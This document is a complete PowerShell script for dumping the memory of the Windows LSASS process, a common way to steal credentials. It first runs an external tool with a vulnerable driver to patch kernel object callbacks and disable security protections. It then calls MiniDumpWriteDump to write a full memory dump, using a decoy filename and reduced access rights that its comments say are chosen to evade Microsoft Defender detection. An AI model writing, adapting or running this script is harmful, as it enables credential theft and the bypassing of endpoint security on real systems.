$pub = $env:PUBLIC
$log = "$pub\cascade.log"
"[*] Starting two-phase LSASS dump $(Get-Date)" | Out-File $log

"[*] Phase1: patching ObCallbacks (Process+Thread)" | Out-File $log -Append
$r1 = & "$pub\cascade.exe" --driver "$pub\BiosToolCommonDriver.sys" --patch-callbacks --no-xor 2>&1
$r1 | Out-File $log -Append
"[*] Phase1 exit=$LASTEXITCODE  at=$(Get-Date)" | Out-File $log -Append

"[*] Phase2: MiniDump via PS P/Invoke" | Out-File $log -Append
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MiniD {
    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(IntPtr hProc, uint pid, IntPtr hFile, uint typ, IntPtr ex, IntPtr us, IntPtr cb);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inh, uint pid);
}
"@

$lsassPid = (Get-Process -Name lsass -ErrorAction SilentlyContinue).Id
"[*] LSASS PID: $lsassPid  at=$(Get-Date)" | Out-File $log -Append

if ($lsassPid) {
    # Rename output to avoid filename-based detection by WdFilter mini-filter
    $outFile = "$pub\svch_heap.bin"
    Remove-Item $outFile -Force -ErrorAction SilentlyContinue

    # Open with minimal rights - PROCESS_VM_READ(0x10) | PROCESS_QUERY_INFORMATION(0x400) | PROCESS_DUP_HANDLE(0x40)
    # Avoids triggering PROCESS_ALL_ACCESS detection heuristic
    $hProc = [MiniD]::OpenProcess([uint32]0x450, $false, [uint32]$lsassPid)
    "[*] OpenProcess handle=0x$([IntPtr]$hProc|ForEach{$_.ToString('X')})  at=$(Get-Date)" | Out-File $log -Append

    if ($hProc -ne [IntPtr]::Zero) {
        $fs = [System.IO.File]::Open($outFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
        "[*] Calling MiniDumpWriteDump(MiniDumpWithFullMemory=2) at=$(Get-Date)" | Out-File $log -Append
        # MiniDumpWithFullMemory = 0x2, captures all readable pages
        $ok = [MiniD]::MiniDumpWriteDump($hProc, [uint32]$lsassPid, $fs.SafeFileHandle.DangerousGetHandle(), [uint32]0x2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
        $lastErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        $fs.Flush(); $fs.Close()
        $sz = (Get-Item $outFile -ErrorAction SilentlyContinue).Length
        "[*] MiniDump ok=$ok  GLE=$lastErr  size=$sz  at=$(Get-Date)" | Out-File $log -Append
    }
}
"[*] Script complete $(Get-Date)" | Out-File $log -Append
